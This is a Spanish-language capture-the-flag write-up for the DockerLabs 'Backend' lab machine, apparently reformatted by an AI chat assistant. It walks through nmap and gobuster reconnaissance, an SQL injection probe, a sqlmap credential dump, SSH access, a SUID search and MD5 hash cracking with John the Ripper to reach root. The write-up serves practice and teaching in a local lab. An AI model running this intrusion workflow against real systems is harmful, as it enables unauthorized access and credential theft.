Aquí tienes tu documento mejorado, con una mejor estructura, ortografía corregida, claridad en las explicaciones y un formato más limpio y llamativo:  

---

# 🖥️ **Máquina: Backend**  
- **🔹 Dificultad:** Fácil  
- **📌 Descripción:**  
  Esta máquina de DockerLabs pone a prueba habilidades en la explotación de bases de datos mediante **inyecciones SQL (SQLi)**. Se enfoca en la identificación y explotación de vulnerabilidades en consultas MySQL, lo que permite el acceso no autorizado a la base de datos y la extracción de información sensible.  

- **🎯 Objetivo:**  
  - Identificar y explotar fallos de seguridad en la aplicación backend mediante técnicas de **inyección SQL**.  
  - Comprender su impacto.  

![Máquina Backend](/Backend/Images/Maquina.png)

---

## 🚀 **Iniciando la Máquina Backend en DockerLabs**  

Para desplegar la máquina, sigue estos pasos:  

### 🔹 1️⃣ Descargar y descomprimir el archivo  
Primero, descarga el archivo `.zip` y extráelo. En mi caso, uso `7z`:  

```bash
7z e backend.zip
```

### 🔹 2️⃣ Ejecutar el despliegue automático  
Una vez descomprimido, ejecuta el siguiente comando para desplegar la máquina:  

```bash
bash auto_deploy.sh backend.tar
```

📌 **Nota:** Asegúrate de tener `7z` instalado y de ejecutar el script en un entorno adecuado con Docker configurado.  

---

## 📡 **Fase de Reconocimiento**  

Una vez iniciada la máquina, verificamos la conexión con:  

```bash
ping -c4 172.17.0.2
```

Si la conexión es exitosa, procedemos con un escaneo de puertos usando `nmap`:  

```bash
nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

📌 **Nota:** En mis repositorios puedes encontrar información sobre los comandos empleados en esta fase, ya que uso scripts personalizados.  

Extraemos la información relevante de los puertos con:  

```bash
extracPorts allPorts.txt
```

![Reconocimiento](/Backend/Images/escaneo.jpeg)

Ahora realizamos un análisis más detallado de los servicios detectados:  

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN target
```

📌 **Nota:**  
- **Puerto 22** → Servicio **SSH** (posible acceso remoto).  
- **Puerto 80** → Página web corriendo en el servidor.  

![Reconocimiento](/Backend/Images/puertos.jpeg)

Para acceder a la página web en el navegador, añadimos la IP al archivo **`/etc/hosts`**:  

```bash
nano /etc/hosts
```

![Directorio](/Backend/Images/etc/hosts.jpeg)

---

## 🔍 **Análisis de la Página Web**  

Recopilamos información con `whatweb`:  

```bash
whatweb 172.17.0.2
```

![Reconocimiento](/Backend/Images/etc/whatweb.jpeg)

Al explorar la página web, encontramos un formulario de **inicio de sesión**. Probamos credenciales por defecto, pero ninguna funcionó.  

![Página](/Backend/Images/etc/pruebas.jpeg)

---

## 🚀 **Enumeración de Directorios**  

Ejecutamos `gobuster` para encontrar posibles rutas ocultas en la página web:  

```bash
gobuster dir -u 172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -b '403,404'
```

📌 **Nota:** Si no tienes la biblioteca de directorios instalada, usa:  

```bash
apt -y install seclists
```

![Directorios](/Backend/Images/etc/directorios.jpeg)

---

## 🛠 **Explotación: Inyección SQL**  

Para comprobar si el formulario de inicio de sesión es vulnerable, probamos con:  

```text
admin'
```

Esto generó un error de base de datos, indicando que el sitio **es vulnerable a inyecciones SQL**.  

![Error](/Backend/Images/etc/sql.jpeg)

### **Automatización con SQLMap**  

Capturamos la solicitud con **Burp Suite** y la guardamos en un archivo `.req`.  

![Peticiones](/Backend/Images/etc/peticion.jpeg)

Usamos `sqlmap` para automatizar la inyección SQL y extraer información sensible:  

```bash
sqlmap -r peticiones.req --level=5 --risk=3 --dump
```

![SQLMap](/Backend/Images/etc/sqlmap.jpeg)

Como resultado, obtuvimos la base de datos `users` con **usuarios y contraseñas**.

---

## 🔑 **Acceso al Sistema vía SSH**  

Probamos las credenciales obtenidas y encontramos que **"pepe"** tiene acceso por SSH:  

```bash
ssh pepe@172.17.0.2 -p 22
```

![SSH](/Backend/Images/etc/conectarssh.jpeg)

📌 **Nota:** Se puede automatizar el intento de acceso con **Hydra**, pero para este ejercicio lo hicimos manualmente.  

---

## 🏗️ **Escalada de Privilegios**  

Buscamos binarios con **SUID** para detectar posibles vulnerabilidades:  

```bash
find / -perm -4000 2>/dev/null
```

Esto reveló que podemos ejecutar `grep` y `ls` con privilegios de **root**.  

![Buscar](/Backend/Images/etc/Buscar.jpeg)

Dentro de los archivos encontramos un **hash MD5**. Guardamos el hash en un archivo y lo desciframos con `John the Ripper`:  

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

📌 **Nota:** También se puede descifrar con herramientas en línea.  

Finalmente, usamos la contraseña obtenida para conectarnos por SSH como **root**.  

![Contraseña Root](/Backend/Images/etc/ContraseñaRoot.jpeg)

---

## 🎉 **Conclusión**  

✔️ **Se logró acceso inicial mediante SQLi.**  
✔️ **Se obtuvieron credenciales de usuario mediante extracción de bases de datos.**  
✔️ **Se accedió por SSH y se escaló privilegios hasta root.**  

🚀 **Máquina "Backend" completada exitosamente.**  

---

### 📌 **Herramientas Utilizadas:**  
- **Nmap** (Escaneo de puertos)  
- **Gobuster** (Enumeración de directorios)  
- **Burp Suite** (Captura de peticiones)  
- **SQLMap** (Automatización de inyecciones SQL)  
- **John the Ripper** (Descifrado de contraseñas)  

---

Este formato mejora la organización, claridad y profesionalismo del documento. ¡Espero que te sirva! 🚀🔥


